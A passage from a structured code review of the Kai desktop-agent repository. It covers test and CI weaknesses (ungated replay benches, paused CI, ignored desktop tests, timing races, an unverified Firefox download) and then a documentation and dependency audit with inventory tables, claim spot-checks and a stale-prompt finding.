- **Evidence:** macos.yml:64-68 `continue-on-error: true` + `kai bench --backend replay ...; echo "replay exit $?"` — no later step reads it; windows.yml:61-66 identical in pwsh; bench/mod.rs:341-357 prints the summary (`report::print`) and returns `ExitCode::SUCCESS` regardless of `stats.passed/total`.
- **Impact:** This is the only end-to-end check of Kai's real hands on real macOS/Windows desktops (AT-SPI equivalent, input, shell, checks). A regression that turns replay 18/19 into 3/19 leaves both workflows green; the operator must open the step log and read the pass table to notice. DECISIONS (2026-10-13) records known replay failures (Windows 10/19 incl. 2 undiagnosed "task setup failed"; macOS 18/19), which explains the tolerance but not the silence.
- **Fix:** Codify the known-failure allowance (expected-fail task id list with reasons) and add a verdict step that fails when passes drop below it or when a new task fails; alternatively add `kai bench --min-pass <n>|--expect <json>` so bench itself returns nonzero, and surface the pass count as a job summary annotation either way.

#### [TEST-03] CI is paused: no push/PR trigger means nothing is verified automatically

- **Severity:** MEDIUM
- **Location:** .github/workflows/ci.yml:3-9; DECISIONS.md (Phase 5 and 2026-10-13 notes); docs/AUDIT_2026_10_15.md A18
- **What:** The CI workflow only exposes `workflow_dispatch`; the comment says it was paused on 2026-10-13 at the owner's request and that resuming requires restoring the `push` and `pull_request` triggers "from the commit before 'CI: paused'". The release workflow compensates on tags (`cargo test --workspace --release`, release.yml:37-38).
- **Evidence:** ci.yml:3-9; the workflow matrix (ubuntu-24.04, windows-latest, macos-15) at line 25 runs fmt, clippy `-D warnings`, `cargo test --workspace`, skills validation and a mock bench. Since the pause, no automated run gates any commit; the repo is private and the plan (DECISIONS, Phase 5) is to flip it public for submission.
- **Impact:** Regressions land unverified until a release tag or a manual dispatch; on a public repo, contributors get no feedback. The audit's A18 already frames the class ("green workflows do not imply desktop acceptance") and acceptance criteria; this finding records the operational risk of the paused state itself and the forgotten-resume risk before submission.
- **Fix:** Before flipping the repo public, restore `push`/`pull_request` triggers (at minimum for `crates/**`), optionally with `paths-ignore` for docs/screenshots/bench-results to keep minutes down; add a checklist item in the ship plan so the restore cannot be missed.

#### [TEST-04] The desktop driver matrix — the only real multi-toolkit AT-SPI check — is `#[ignore]`d and skips count as success

- **Severity:** MEDIUM
- **Location:** crates/kai-os/tests/driver_matrix.rs:21,204-205,218-226; docs/DRIVER_MATRIX.md
- **What:** `every_toolkit_takes_the_accessibility_path_and_the_widget_changes` is ignored by default (needs a desktop), and when a fixture cannot start ("fixture did not start") or has no window ("no fixture window") it is recorded as `skipped:` and the test proceeds; only rows labeled FAIL can fail the run. The known-gap inversion (a documented gap that now works fails the test, lines 258-266) is excellent, but no workflow ever runs the file: `scripts/desktop/install.sh`/`start.sh` exist yet are not wired into any workflow.
- **Evidence:** driver_matrix.rs:204-205 `#[ignore = "needs a desktop: see the module docs"]`; :218-226 skip branches; module doc line 21 "A toolkit whose fixture cannot start is reported as skipped, not passed" (good intent, but with no CI wiring it is never read by anyone who does not run it manually); no workflow references scripts/desktop.
- **Impact:** Linux AT-SPI/act paths across GTK3/Qt/X11 toolkits (including the documented Qt 5.15 no-tree gap and the Firefox button-action gap) are verified only when a human runs `cargo test -- --ignored` on a provisioned desktop. A UI-automation regression (e.g. roles or action mapping) can ship unnoticed; the known-gap inversion only fires during manual runs.
- **Fix:** Add a manual (or nightly) Linux job that runs scripts/desktop/install.sh + `source scripts/desktop/start.sh` + `cargo test -p kai-os --test driver_matrix -- --ignored --nocapture`, with `KAI_MATRIX_REQUIRE_FIXTURES=1` making missing fixtures a failure; keep the known-gap logic as is.

#### [TEST-05] Screenshot/capture steps accept far fewer screens than the product defines, and swallow the app's exit code

- **Severity:** MEDIUM
- **Location:** .github/workflows/screenshots.yml:48-55; .github/workflows/macos.yml:48-63; .github/workflows/windows.yml:45-60
- **What:** The capture gates are count-based and weak: screenshots.yml requires `>10` PNGs, macOS requires `n -gt 0`, Windows requires `shots.Count -ne 0`, while DECISIONS (2026-07-12/2026-10-09 notes) and screenshots/README describe 25 screens/states light+dark (≈60 files). screenshots.yml also discards the app's exit status (`timeout 600 xvfb-run ... || echo "app exited with $?"`) so a mid-capture crash passes as long as 11 PNGs exist; macOS/Windows check the exit code only to log it.
- **Evidence:** screenshots.yml:53-55; macos.yml:60-63 (`wait $pid && code=0 || code=$?` then only `n -gt 0`); windows.yml:53-60 (`if ($shots.Count -eq 0) { ... exit 1 }`).
- **Impact:** A rendering regression that drops or blanks most states (the repo has exactly this history: the black-frame/headless-platform bug fixed on 2026-10-09) would still produce >10 PNGs and pass; missing-state and exit-code failures are invisible without reading logs/artifacts.
- **Fix:** Pin the expected file list (screenshots/README already enumerates states) and assert exact presence plus non-trivial file size, or assert the full count (e.g. ≥ all expected states × 2 themes) and fail on nonzero app exit; upload a manifest diff on mismatch.

#### [TEST-06] kai-app has no test of the app itself: most UI pages and the run view are untested

- **Severity:** MEDIUM
- **Location:** crates/kai-app/src/ (45 files, 26 with no tests); e.g. pages/running.rs:1-482, pages/capture.rs:1-492, agent.rs, mini.rs, ui.rs, onboarding/mod.rs
- **What:** kai-app's tests are pure/state helpers: state_tests.rs, skills_tests.rs and inline tests in ~17 files (follow policy, state transitions, keychain source guard, brand contrast, etc.). The actual GPUI views, run-driving, mini window, onboarding flow, capture harness and every page except history/models/skills/bench are untested, and no automated check boots the app — the only "does it run" gate is the manual screenshots workflow.
- **Evidence:** `grep -rln "mod tests|#[test]" crates/kai-app/src` → 19 files out of 45; the untested list includes pages/home, running, sessions, settings, memory, model_settings, capture, capture_models, done, plus app.rs/mini.rs/ui.rs/chrome.rs/onboarding.
- **Impact:** `cargo test --workspace` (when CI runs) exercises primarily the state layer. UI regressions — the exact class of bugs the Kai Glass review fixed (idle animation redraw, Save-as-skill layout, approval JSON overflow) — are caught only by manual screenshot runs, which are also the weakest-gated workflow (TEST-05).
- **Fix:** Add a headless boot smoke test (launch the binary with `KAI_CAPTURE` for one screen and assert exit 0 + PNG exists) to ci.yml on Linux; unit-test the page view-models where logic exists (`pages/running.rs` progress math, `mini.rs` status text) without constructing gpui elements.

#### [TEST-07] Platform-native code has no tests on the platform it serves (macOS AX, Windows UIA, local runtime non-Linux)

- **Severity:** MEDIUM
- **Location:** crates/kai-os/src/a11y/macos.rs:1-265, a11y/macos_act.rs:1-100, a11y/windows.rs:1-123, a11y/windows_act.rs:1-151; crates/kai-os/tests/local_install.rs:14,247,256,311 (#[cfg(target_os = "linux")]); crates/kai-os/src/permissions.rs (no tests)
- **What:** The macOS AX reader/actuator, the Windows UIA reader/actuator and the permission probes have no test modules; the local-runtime supervision e2e is Linux-only by cfg. Windows UIA events are additionally unwired (DECISIONS, VERIFICATION.md "Stage 2, Windows"). The macOS live check (macos.yml:42-47, gated by :81-83) is a real compensating control for text entry/tree read; there is no Windows equivalent beyond the non-gating replay.
- **Evidence:** kai-os test-module grep lists no macos*.rs/windows*.rs entries; local_install.rs gates the supervision tests (line 14 and the three `#[cfg(target_os = "linux")]` groups); docs/AUDIT platform matrix "Fresh unit evidence here: None for Windows branches … Not run".
- **Impact:** A regression in `AXValue` fill semantics, secure-field handling, coordinate scaling (the 2x points/pixels bug class) or Windows key injection would ship between manual macOS workflow runs, and Windows input correctness has no automated check at all. The audit (A14) already notes platform support is narrower than one uniform experience.
- **Fix:** Extract pure logic (attribute name mapping, macos_roles tables, role/focus filtering, permissions state machine) into testable functions with unit tests behind `#[cfg(target_os)]`; extend macos.yml to cover the AX fill/secure-field assertions already used by the live check; add a minimal windows.yml pwsh smoke that drives Notepad via UIA (already partially proven by replay on Windows).

#### [TEST-08] Temp directories keyed by `process::id()` risk stale-state collisions; driver-matrix profile dir has no key at all

- **Severity:** MEDIUM
- **Location:** crates/kai-core/tests/fast_observe.rs:261; crates/kai-core/src/plan_cache.rs:274; crates/kai-core/src/memory/tests_store.rs:224; crates/kai-core/src/procedure_tests.rs:212; crates/kai-core/src/models/hub_tests.rs:168,209; crates/kai-core/src/recorder.rs:301; crates/kai-cli/src/data/tests.rs:30; crates/kai-cli/src/memory.rs:305; crates/kai-os/tests/driver_matrix.rs:82
- **What:** These tests build temp paths as `temp_dir()/kai-…-{process::id()}` instead of using `tempfile::TempDir` (already a dependency and used by browser_lane/local_install). PIDs recycle across runs, so a crashed earlier run can leave state behind that the next run with the same PID reuses (fast_observe removes the dir first at line 262; others do not all do so). driver_matrix.rs:82 hard-codes `kai-driver-matrix-firefox` with no PID, so two concurrent manual runs collide.
- **Evidence:** the grep above; e.g. hub_tests.rs:168 uses `kai-store-{pid}` without pre-cleanup; recorder.rs:301 includes the test name (good), data/tests.rs:30 includes the name (good), driver_matrix.rs:82 does not.
- **Impact:** Low-frequency, hard-to-reproduce flakes or wrong-pass/wrong-fail results when test binaries run in parallel on loaded machines or when a killed run recycles a PID; also leaves litter in the system temp dir.
- **Fix:** Replace with `tempfile::TempDir` (auto-cleanup, unique) or at least prefix with a random suffix; for the driver matrix use `tempfile::tempdir()` for the Firefox profile.

#### [TEST-09] Timing-based synchronization and a bind-then-release port race in the runtime-supervision tests

- **Severity:** MEDIUM
- **Location:** crates/kai-os/tests/local_install.rs:248-254,274,297,306,337; crates/kai-core/tests/subagents.rs:76
- **What:** `free_port()` binds 127.0.0.1:0, reads the port, and drops the listener; the fake server (and later `m.start`) binds that port afterwards — a classic TOCTOU race on a loaded runner. Post-drop assertions use fixed sleeps (500 ms at :297, 300 ms at :306) assuming process death completes in time. subagents.rs:76 sleeps 50 ms to let a sub-agent event land.
- **Evidence:** local_install.rs:248-254 `TcpListener::bind(...).local_addr().port()` then used at :274/:337; sleeps at :297/:306; subagents.rs:76 `tokio::time::sleep(Duration::from_millis(50))`.
- **Impact:** Flaky failures under CPU load (exactly the condition the repo's own macOS notes describe for browser races), and the fixed sleeps make the tests slower than the events they wait for.
- **Fix:** Keep the listener alive and hand it to the fake server (or retry on `AddrInUse`); replace fixed sleeps with bounded `wait_for`-style polling (`retry until health(port) is false` within e.g. 5 s), as driver_matrix.rs already does with its `wait_for` helper.

#### [TEST-10] Screenshots workflow can commit PNGs straight to the default branch

- **Severity:** LOW
- **Location:** .github/workflows/screenshots.yml:9,17-18,60-72
- **What:** The workflow is `workflow_dispatch`-only with `permissions: contents: write`, and its commit step has no branch guard: a manual run on `main` (the default branch) commits generated PNGs directly to `main` via `git pull --rebase` + `git push origin HEAD:main`. Git history shows a default-branch guard was added in the "Kai Glass review" commit and then removed when the push trigger was dropped (commit 4a8d191), so DECISIONS' note ("pushes to the default branch are now skipped (a manual run there still works)") no longer matches what can happen on a manual run.
- **Evidence:** screenshots.yml:60-72 has no `if:`; `git log -p -- .github/workflows/screenshots.yml` shows the removal; DECISIONS.md (~line 487) describes the earlier guard.
- **Impact:** Bot commits land on the protected-ish default branch without review; the `git pull --rebase` + push sequence can also conflict with concurrent pushes and fail the workflow mid-commit. Low probability (manual trigger) but trivially avoidable.
- **Fix:** Have the commit step push to a dated branch (or open a PR with `gh`), or restore an explicit `if: github.ref_name != github.event.repository.default_branch` on the commit step; update the DECISIONS note.

#### [TEST-11] Desktop install script downloads Firefox without checksum verification and can leak its temp dir

- **Severity:** LOW
- **Location:** scripts/desktop/install.sh:30-36
- **What:** The script curls Mozilla's `firefox-esr-latest-ssl` redirect straight into `/opt` (as root) with no hash/signature check, and `tmp="$(mktemp -d)"` is only removed after a successful `tar` (`set -e` aborts before `rm -rf "$tmp"` on failure).
- **Evidence:** install.sh:31-35; contrast scripts/macos/bundle.sh, which verifies its own outputs with `codesign --verify` and writes a `.sha256`; the local-model catalog pins SHA-256 by policy (DECISIONS) — the desktop fixture script is the one download without one.
- **Impact:** A compromised/redirected tarball would be unpacked as root in a devcontainer; leaked temp dirs accumulate across failed CI/manual runs.
- **Fix:** Pin the ESR version + SHA-256 (or verify Mozilla's signed checksums file), and `trap 'rm -rf "$tmp"' EXIT` before the download.

#### [TEST-12] live_check.sh depends on a fixed 4 s sleep and on sed-parsing probe output

- **Severity:** LOW
- **Location:** scripts/macos/live_check.sh:24-34
- **What:** `open_doc` sleeps 4 s and assumes TextEdit is ready; `doc_text()` extracts the value with `sed -n 's/^value #[0-9]*: //p'`, coupling the check to the probe's human-readable output format. On a busy Mac runner the 4 s can be short (the rest of the script then fails with a useful message, so the failure is loud, not silent).
- **Evidence:** live_check.sh:24-29 `sleep 4`; :32-34 `sed` pattern; the script otherwise uses strict mode and explicit `fail()` messages, and macos.yml gates it with a verdict step (:81-83).
- **Impact:** Rare spurious failures on slow runners; a probe output tweak breaks this check with a confusing "typed text did not land" message rather than a parse error.
- **Fix:** Poll for readiness (e.g. probe tree output contains the textfield within a bounded loop) instead of a fixed sleep; assert the sed produced a non-empty value with an explicit message.

#### [TEST-13] No property-based testing and no CLI end-to-end harness

- **Severity:** INFO
- **Location:** Cargo.toml and crates/*/Cargo.toml (no proptest/quickcheck/insta/assert_cmd); crates/kai-cli has no tests/ directory
- **What:** There is no property/fuzz layer for the parser-like pure modules (schema.rs, reply.rs, shell_ro.rs, task_checks.rs, url normalisation, redaction) and no spawn-the-binary CLI tests. In practice the table-driven tests are extensive (shell_ro alone asserts 50 commands; task_checks asserts 11+12 phrasings), and CI smoke-runs the CLI against mock bench, so this is an infrastructure observation rather than a gap with evidence of escaped bugs.
- **Evidence:** dependency grep returns nothing; `ls crates/kai-cli/tests` does not exist; bench/data tests are inline modules.
- **Impact:** None present; would help the redaction/URL/allow-list surfaces where combinatorial inputs are the adversary.
- **Fix:** Optional: proptest around `ReadOnlyCmd::parse`, `redact_text`, URL normalisation and reply salvage; an `assert_cmd` test for `kai run --dry-run`/`skill validate` error paths.

#### [TEST-14] docs/VERIFICATION.md's guarantee table is accurate; its "361 tests" claim is stale

- **Severity:** INFO
- **Location:** docs/VERIFICATION.md:254-281
- **What:** I mechanically verified every test named in the Guarantees table exists with that exact name (`done_is_refused_while_a_probe_fails`, `the_model_cannot_set_a_status`, `a_refused_probe_keeps_the_outcome`, `writes_and_anything_off_the_allowlist_are_refused`, the timeout/bounded-gate/waiver/unchanged-behaviour/redaction/events tests), and the doc's "all 361 tests that existed before" no longer matches the suite size (~650 test functions today). docs/HUMAN_CHECKS.md's referenced helpers/tests likewise exist.
- **Evidence:** grep for each name succeeds (verify_e2e.rs, ledger_tests.rs, shell_ro.rs); test-attribute count across crates/ is 652.
- **Impact:** Docs understate (not overstate) the suite; the mutation-checked guarantee table is unusually trustworthy and should be preserved as the template for new guarantees.
- **Fix:** Drop the hard number or make it a range ("the 600+ tests that existed before"); regenerate the table when guarantees are added.

#### [TEST-15] The two `#[ignore]`s have accurate reasons; skipping is manual-only

- **Severity:** INFO
- **Location:** crates/kai-os/tests/driver_matrix.rs:205; crates/kai-os/tests/browser_lane.rs:322
- **What:** Only two `#[ignore]`s exist in the workspace, both carrying `#[ignore = "..."]` reasons that correctly describe the requirement (a desktop / a display + AT-SPI + headed browser). No reasonless ignores, no `#[cfg(ignore)]` tricks. Both are covered by TEST-04/TEST-01 concerns about *enforcement*, not by reason quality.
- **Evidence:** `grep -rn '#\[ignore' crates/` returns exactly: driver_matrix.rs:205 "needs a desktop: see the module docs"; browser_lane.rs:322 "needs a display, the AT-SPI bus and a headed browser".
- **Impact:** Positive: the suite never hides a skipped test without saying why.
- **Fix:** None.

### Not needed / remove

- **Nothing in the test tree should be deleted.** The one-off `scripts/icons/extract-mark.swift` has no tests, but it is a deterministic asset pipeline with printed calibration output (`mean core colour #3769E3`), regenerated rarely; do not build test scaffolding for it.
- `scripts/desktop/stop.sh` and `run.sh` skip `set -u`/`pipefail`; this is fine for thin wrappers. Do not add strict mode to `start.sh` — it is designed to be sourced and to `return` statuses.
- Keep the `--install` `rm -rf /Applications/Kai.app` in bundle.sh (documented, scoped); keep the ad-hoc signing (documented in docs/MACOS.md with quarantine instructions).
- Consider removing the two `continue-on-error` steps' *silent* aspect only — keep the steps themselves; they are the only real-desktop evidence.

### What's good (cited)

- **Mutation-checked guarantees:** docs/VERIFICATION.md:258-261 documents removing each guard and watching the test fail; I verified the named tests exist. `task_checks_e2e.rs` and `reply_salvage_e2e.rs` carry the same style ("fails without the guard, checked").
- **Differential prompt tests:** memo_e2e.rs and verify_e2e.rs `no_outcomes_means_unchanged_behaviour` compare model turns/calls with the feature off vs on, byte-stable prompts asserted.
- **Honest known-gap inversion:** driver_matrix.rs:258-266 fails when a documented gap starts passing, keeping DRIVER_MATRIX.md honest.
- **Wire-shape mocks:** client_support/mod.rs builds scripted HTTP/S responses (Gemini inlineData/thinkingConfig refusal, OpenAI strict schema, SSE); DECISIONS documents these as the only provider exercise (no keys/GPU in CI).
- **Regression tests born from live bugs:** loop_e2e (40× repeat-file write, stall brake), reply_salvage_e2e (10 real cut replies), browser race fixes — each tied to a documented live incident.
- **Workflow hygiene when it runs:** `fmt --check`, clippy `-D warnings`, `cargo test --workspace` including kai-app (members list), concurrency cancellation, rust-cache reuse, no `${{ secrets.… }}` anywhere in workflows, release packaging verified by unpacked-CLI smoke tests on all three OSes, macOS live check properly gated behind a verdict step.
- **Scripts quality:** `set -euo pipefail` in all leaf scripts that mutate state (6 of 8), scoped destructive operations, `codesign --verify --strict`, sha256 sidecars, and an idempotent, liveness-checked desktop starter.

### Open questions

1. Will the CI `push`/`pull_request` triggers be restored before the repo goes public (DECISIONS says the repo must be flipped public for the hackathon)? If intentionally not, should release-tag testing be declared the sole gate?
2. Is installing a Chromium build in the Ubuntu CI job acceptable (size/minutes/licence) to activate the ten browser tests, or is the decision to keep them developer-only?
3. Should the replay bench's known failures (Windows 10/19, macOS 18/19, 2 undiagnosed "task setup failed") be encoded as an expected-fail manifest so the step can gate instead of `continue-on-error`?
4. Does screenshots/README contain an exact filename manifest that TEST-05's fix can assert against, or does it need to be created?
5. Are the macOS/Windows AX/UIA branches expected to stay unit-untested (audit A14 accepts some of this), or should pure-function extraction be scheduled?
6. Is `kai bench --backend mock` in CI expected to gate 30/30 (currently it cannot — bench always exits 0), or is it intentionally plumbing-only?

---

## 3.10 DOC — Documentation, metadata, dependencies

*Reviewed files: 48. Findings: 0C / 0H / 1M / 6L / 3I.*

Date: 2026-10-16. Working tree at `fc9e63e` (branch `main`), plus one untracked
file `CODE_REVIEW_2026_10_16.md`. Read-only: no file in the repository was
modified. Every file below was read in full; counts and code claims were
cross-checked against sources with read-only shell commands.

### Scope checklist

#### Root metadata
| File | Lines | Verdict |
| --- | ---: | --- |
| `README.md` | 256 | Strong pitch with honest benchmark caveats; three inventory counts stale (17 models / 9 skills / 10 tasks). |
| `DECISIONS.md` | 1007 | Excellent append-only decision log; the "Fixed decisions" preamble still lists macOS as not a release target. |
| `CLAUDE.md` | 136 | Accurate agent guide (layout, commands, rules); no drift found. |
| `LICENSE` | 21 | Plain MIT, matches `license` fields in all crates. |
| `.gitignore` | 21 | Correct: `/target`, `/dist`, results noise ignored; no tracked artifact conflicts found. |
| `.claude/settings.json` | 10 | Leftover Claude Code permission allowlist for a local jevos/OpenVINO scratch install; unrelated to current tooling. |
| `vendor/README.md` | 41 | Model provenance doc: pinned upstream SHA, license, recovery story, and the intentional 2026-10-16 local patch. |
| `CODE_REVIEW_2026_10_16.md` | 77 | Untracked scaffold for this review (CORE-ENG … TBD area map); §3/§4 placeholders still empty. |

#### Cargo files
| File | Lines | Verdict |
| --- | ---: | --- |
| `Cargo.toml` | 56 | Clean workspace: edition 2024, rust-version 1.95, MIT, `gpui-pre =0.3.8`, vendored Ely path dep, thin-LTO release profile. |
| `Cargo.lock` | 9954 | 939 packages, all crates.io (no git sources); single versions of every heavy runtime crate; duplicates only platform-shim churn. |
| `crates/kai-core/Cargo.toml` | 30 | OS-free harness deps all referenced in sources; reqwest pinned to `rustls-tls-native-roots`. |
| `crates/kai-os/Cargo.toml` | 59 | Platform deps correctly cfg-gated (`atspi`/`zbus` Linux, `uiautomation`/`windows` Windows, `objc2` macOS); all sampled deps used. |
| `crates/kai-cli/Cargo.toml` | 34 | Small CLI surface, no unused entries spotted. |
| `crates/kai-app/Cargo.toml` | 49 | App deps (`arboard`, `fast_image_resize`, `jiff`, `image`, `xcap`, `zip`) all referenced in `kai-app`/`kai-os` sources. |

#### docs/** (all files)
| File | Lines | Verdict |
| --- | ---: | --- |
| `docs/APP_ICON.md` | 57 | Current (matches the new cobalt-orbit icon commit); no drift. |
| `docs/AUDIT_2026_10_15.md` | 482 | The strongest document in the tree: 20 findings with acceptance criteria, plus a dated remediation section with a revision hash; only A17/A18/A20 remain open. |
| `docs/BACKGROUND.md` | 94 | Consistent with `run_task` background/timeout code paths described; no contradiction found. |
| `docs/BROWSER.md` | 162 | Matches the Linux/macOS browser lane; says experimental and Windows-unavailable, matching `kai-os/src/web`. |
| `docs/COMPUTER_TOOLS.md` | 105 | Correctly describes the new versioned computer-tools contract in `kai-core/src/computer/`. |
| `docs/DATASET.md` | 254 | Training-data export doc; consistent with `kai-cli` export commands; train/ parked noted. |
| `docs/DEMO.md` | 47 | Short demo script; paths/commands spot-checked OK. |
| `docs/DESIGN.md` | 350 | Drift (A20): opens with the superseded saffron scheme, then adds "Kai Glass (v2)"; audience wording is Linux/Windows-only. |
| `docs/DRIVER_MATRIX.md` | 76 | Historical driver matrix; explicitly marked as historical/ignored tests, consistent with code. |
| `docs/EXECUTOR.md` | 268 | jevos executor doc still matches README's "experimental, off by default, no measurable benefit" wording. |
| `docs/HARNESS.md` | 318 | Deep, useful harness doc; three stale details: "(110 tests)", `thinkingLevel: minimal`, Linux/Windows-only framing. |
| `docs/HUMAN_CHECKS.md` | 172 | Matches `HumanCheck` flow and integration tests. |
| `docs/LOCAL_MODELS.md` | 347 | Runtime install/serve docs match `kai-os/src/local` (download, verify, supervise). |
| `docs/LONG_RUNS.md` | 83 | Consistent with checkpoint/ledger behavior. |
| `docs/MACOS.md` | 167 | Current: documents the Apple-Silicon release path that `release.yml` now builds. |
| `docs/MCP.md` | 65 | Matches MCP client code; no drift found. |
| `docs/MEMORY.md` | 255 | Matches scope/word recall implementation; explicitly says "not embeddings". |
| `docs/MODEL_STORE.md` | 132 | Correct architecture (curated shelf + pulls); no explicit count, so it stays right even while README's "17" drifts. |
| `docs/NEXT_SESSION_PROMPT.md` | 73 | Stale handoff prompt ("No macOS work", Linux/Windows only, 2026-10-12 state); unreferenced by any file. |
| `docs/PROCEDURES.md` | 110 | Matches procedures code and switches. |
| `docs/RESEARCH.md` | 701 | 2026-10-09 speed research (RESEARCH-v1); superseded in part by the two 2026-10-12 papers, which cross-link and disclaim repetition. |
| `docs/RESEARCH_2026_10_FOUNDATIONS.md` | 392 | 2026-10-12; maps papers to Kai code; accurate links, no drift found. |
| `docs/RESEARCH_2026_10_VENDORS.md` | 346 | 2026-10-12; Anthropic/OpenAI comparison; explicitly positional, not a spec. |
| `docs/ROADMAP.md` | 851 | 2026-10-10 training plan, marked "parked" with a date note; targets labeled as targets. Consistent naming aside ("Jev" vs "jevos"). |
| `docs/SAFETY.md` | 140 | Matches risk gates/kill switch/approval code. |
| `docs/SHIP_PLAN.md` | 100 | Release checklist; broadly current after the macOS reversal, but does not restate platform counts. |
| `docs/SKILLS.md` | 76 | Format spec is accurate; "Shipped skills" table lists 9 while `skills/` has 10 (blender-modeling missing). |
| `docs/UI_UX_AUDIT_2026_10_16.md` | 226 | Recent UI/UX audit (R1–R8, U16); does not link its two machine-readable evidence files. |
| `docs/VERIFICATION.md` | 335 | Matches verification/ledger implementation; counts in it predate this week's runs. |
| `docs/evidence/computer-use-foundation-2026-10-16.json` | 45 | Valid, revision-linked (c9054dd), honest `unverified` list; linked from AUDIT. |
| `docs/evidence/ui-ux-audit-2026-10-16.json` | 32 | Valid (618 tests, baseline f27499b); referenced from no document. |
| `docs/evidence/ui-ux-audit-2026-10-16-pass2.json` | 32 | Valid (641 tests, baseline 6face92); referenced from no document. |
| `docs/superpowers/specs/2026-10-15-computer-use-foundation-design.md` | 306 | Approved spec for the computer-tools v1 contract; matches implementation. |
| `docs/superpowers/plans/2026-10-15-computer-use-foundation.md` | 105 | Implementation plan; matches remediation section of the audit. |

Spot-checked but not documentation (inputs to claims, not audited line-by-line):
`crates/kai-core/src/models/catalog.json` (16 models), `bench/tasks.yaml`
(30 tasks), `skills/` (10 dirs), `.github/workflows/` (5 files),
`docs/img/` (2 files), `dist/kai-macos-aarch64.zip` (gitignored):
capture, tasks.yaml, and catalog.json parsed as valid; workflows and skills
dirs enumerated.

### Verdict

This is an unusually well-maintained documentation tree for a pre-release
product: dated research papers that cross-reference instead of repeat,
an append-only decision log, per-finding audits with acceptance criteria,
and machine-readable evidence JSONs that name the exact revision they were
produced on and list what remains unverified. Link integrity is perfect
(0 broken relative links across root + docs), and the benchmark section of
the README is more honest than most: it labels one-run results as
non-significant and separates model time from rate-limit waits. The current
technical documents (AUDIT, UI_UX_AUDIT, COMPUTER_TOOLS, MACOS, superpowers
spec/plan) describe the code as it is today.

Freshness is the weak axis: the repository pivoted twice in the last week
(computer-use foundation on 2026-10-15/16, macOS promoted to a release
target), and several documents predate the pivot — `NEXT_SESSION_PROMPT.md`
still says "No macOS work" and is linked from nowhere; `HARNESS.md` cites
"(110 tests)" and `thinkingLevel: minimal` against a current 641-test,
`low`-level reality; `DECISIONS.md`'s fixed-decisions preamble still lists
macOS as not a release target. Three README inventory counts (17 models /
9 skills / 10 benchmark tasks vs catalog.json 16 / skills/ 10 /
bench/tasks.yaml 30) were flagged by yesterday's audit (A20) and remain
partially unfixed; the skills count is repeated in `SKILLS.md`, which
omits the tenth skill (`blender-modeling`) from its shipped table.

Dependency and repository hygiene are solid. The lockfile has 939 packages,
zero non-crates.io sources, and single versions of tokio/reqwest/image/
rustls/hyper; the only duplicates are the usual cross-platform shim churn
(windows-sys ×6, hashbrown ×4, rand ×3). Every declared dependency sampled
was actually referenced in sources, licenses are MIT workspace-wide, and the
20 MB vendored Ely fork is the one deliberate heavyweight — documented with
its provenance and patch delta in `vendor/README.md`. Residual hygiene
items are small: the leftover jevos allowlist in `.claude/settings.json`,
two unlinked evidence JSONs, one unused image, and the untracked review
scaffold at the repo root.

Scores: accuracy 6/10 (core docs precise; headline counts and two handoff
facts stale), usefulness 8/10 (deep, task-oriented, evidence-linked),
freshness 5/10 (several pre-10-15 documents frozen), dependency hygiene 8/10,
repo hygiene 7/10.

### Claim spot-check

| Claim | Reality | Result |
| --- | --- | --- |
| README: "17 pinned, hash-checked models" | `catalog.json` contains 16 model entries; SHA-256 streaming verification exists in `kai-os/src/local/download.rs` | **FAIL** (count; hash-checking itself passes) |
| README architecture: "skills/ 9 shipped skills" | `skills/` contains 10 directories (`blender-modeling` is the extra) | **FAIL** |
| README architecture: "bench/ 10 benchmark tasks" | `bench/tasks.yaml` defines 30 tasks (`grep -c id:`) | **FAIL** |
| SKILLS.md "Shipped skills" table | 9 rows; `blender-modeling` absent despite being shipped | **FAIL** |
| HARNESS.md: "`cargo test --workspace` (110 tests)" | Latest 2026-10-16 evidence: 641 passed / 0 failed / 2 ignored | **FAIL** |
| HARNESS.md: `thinkingLevel: minimal` | DECISIONS.md: `thinkingLevel: "low"` plus retry-without-thinking fallback | **FAIL** |
| NEXT_SESSION_PROMPT: "No macOS work", Linux/Windows-only | README/`release.yml`/DECISIONS now cover macOS Apple Silicon as a release artifact | **FAIL** |
| DECISIONS.md fixed decisions: "macOS ... not a release target" | Reversed by later 2026-10-15 entries; `release.yml` builds `macos-15` | **FAIL** (superseded, unannotated) |
| A18: "CI is manually paused by owner policy" | `ci.yml` is `workflow_dispatch`-only with the PAUSED comment; `continue-on-error` in macos.yml ×2 and windows.yml ×1 | **PASS** |
| Release claim: macOS artifact | `release.yml` matrix builds `macos-15` → `kai-macos-aarch64.zip`; artifact present in gitignored `dist/` | **PASS** |
| Audit remediation revision `c9054dd` / branch `computer-use-foundation` | Evidence JSON carries the same revision and branch | **PASS** |
| vendor/README local patch description | `layout/scroll.rs` + `scroll_policy.rs` clamp/parent-boundary code present; `shell/activity.rs` focus-ring changes present | **PASS** |
| Relative links across README/DECISIONS/docs | 0 broken links (scripted check of every `[](...)`) | **PASS** |
| README benchmark table footnote sources | `bench/results/2026-10-10-*.json` files exist for the cited models | **PASS** |

### Prior-audit status (AUDIT_2026_10_15.md findings touching docs/meta/deps)

| ID | Status | Evidence |
| --- | --- | --- |
| A17 (model files ≠ compatibility) | Open / by design | Remediation text says "model catalog is intentionally unchanged"; catalog still 16 rows with no action-dialect/profile metadata; README count adds drift. |
| A18 (green workflows ≠ acceptance) | Open | `ci.yml` still paused per owner; `continue-on-error` still present in macos/windows live jobs. |
| A19 (dead global launcher) | **Fixed** | `obsolete_launcher_setting_is_ignored_and_not_written_back` test in `settings_tests.rs`; `global-hotkey` now used only by the kill switch (`kai-os/src/kill.rs`). |
| A20 (design/inventory drift) | **Partial** | README pitch now includes macOS; skills 9-vs-10, bench 10-vs-30, DESIGN saffron/Glass and HARNESS counts remain. |
| A08 (nested UI scroll consumes wheel) | **Partial** | Vendor scroll clamp patch landed and is documented; live nested-scroll acceptance never exercised (vendor README admits this). |
| A01 (unicode truncation panic) | Fixed (host) | `schema.rs:145` uses `floor_char_boundary(MAX_TEXT_LEN)`; 2/3/4-byte tests reported in remediation. |
| A05/A06 (legacy protocol; move/drag skipped) | Fixed (host) | `kai-os/src/input/execute.rs` implements `Move`/`Drag`; remediation says legacy mapping now rejects instead of skipping. |
| A02–A04, A07 | Fixed per remediation text only | Not re-executed in this read-only pass; branch evidence (`c9054dd`) cited in the audit. |

### Findings

#### [DOC-01] Stale continuation prompt tells the next session macOS is out of scope
**Severity:** MEDIUM
**Location:** `docs/NEXT_SESSION_PROMPT.md` (73 lines; tracked; referenced by no file — `grep -rln NEXT_SESSION` finds only itself)
